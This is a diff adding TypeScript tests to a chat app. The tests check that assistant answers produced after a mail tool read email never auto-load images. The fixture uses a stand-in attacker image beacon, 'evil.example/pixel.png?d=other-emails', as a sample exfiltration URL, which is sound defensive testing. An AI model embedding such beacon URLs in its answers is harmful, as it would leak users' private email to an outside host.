@@ -18,11 +18,14 @@ import {
 } from "./chatPanelMessages";
 import { buildVideoMessage } from "./chatVideo";
 import {
+  MAIL_READ,
   answerImages,
   mediaContent,
+  readMailContext,
   readSharedPages,
   sharedPagesLabel,
   sharedPagesNote,
+  withMailContext,
   withSharedPageMarks,
   type SharedPages,
 } from "./sharedPages";
@@ -207,4 +210,47 @@ describe("the chat's own media messages", () => {
       expect(mediaContent({ content: marker, pageContext: marked })).toBe("");
     },
   );
+});
+
+describe("an answer for which a mail tool read email", () => {
+  const beacon = "https://evil.example/pixel.png?d=other-emails";
+
+  it("is marked by anything the server sent, never by nothing", () => {
+    expect(readMailContext({ read: true })).toEqual({ read: true });
+    expect(readMailContext({})).toEqual({ read: true });
+    expect(readMailContext(false)).toEqual({ read: true });
+    expect(readMailContext(undefined)).toBeUndefined();
+    expect(readMailContext(null)).toBeUndefined();
+  });
+
+  it("never loads its images and has no media of its own, like an answer from a shared page", () => {
+    expect(answerImages({ mailContext: { read: true } })).toBe("link");
+    const image = buildImageMessage({ url: beacon, prompt: "", model: "m" });
+    expect(readImageMessage(mediaContent({ content: image, mailContext: { read: true } }))).toBeFalsy();
+    expect(extractMarkdownImage(mediaContent({ content: `![x](${beacon})`, mailContext: { read: true } })).imageUrl).toBeFalsy();
+    expect(readImageMessage(mediaContent({ content: image }))).toBeTruthy();
+  });
+
+  it("is not carried to the answers after it: the email is not in what they read", () => {
+    const chat = [
+      { role: "user" as const, content: "Summarise my unread mail" },
+      { role: "assistant" as const, content: "Three emails…", mailContext: MAIL_READ },
+      { role: "user" as const, content: "Draw a cat" },
+      { role: "assistant" as const, content: buildImageMessage({ url: "/api/chat/media/7/file", prompt: "a cat", model: "m" }) },
+    ];
+    const marked = withSharedPageMarks(chat);
+    expect(answerImages(marked[3])).toBe("load");
+    expect(readImageMessage(mediaContent(marked[3]))).toBeTruthy();
+  });
+
+  it("is put on and taken off a message without touching the rest", () => {
+    const message: { role: string; content: string; mailContext?: { read: true } } = { role: "assistant", content: "Hi" };
+    const on = withMailContext(message, MAIL_READ);
+    expect(on).toEqual({ role: "assistant", content: "Hi", mailContext: { read: true } });
+    expect(withMailContext(on, MAIL_READ)).toBe(on);
+    const off = withMailContext(on, undefined);
+    expect(off).toEqual({ role: "assistant", content: "Hi" });
+    expect("mailContext" in off).toBe(false);
+    expect(withMailContext(message, undefined)).toBe(message);
+  });
 });
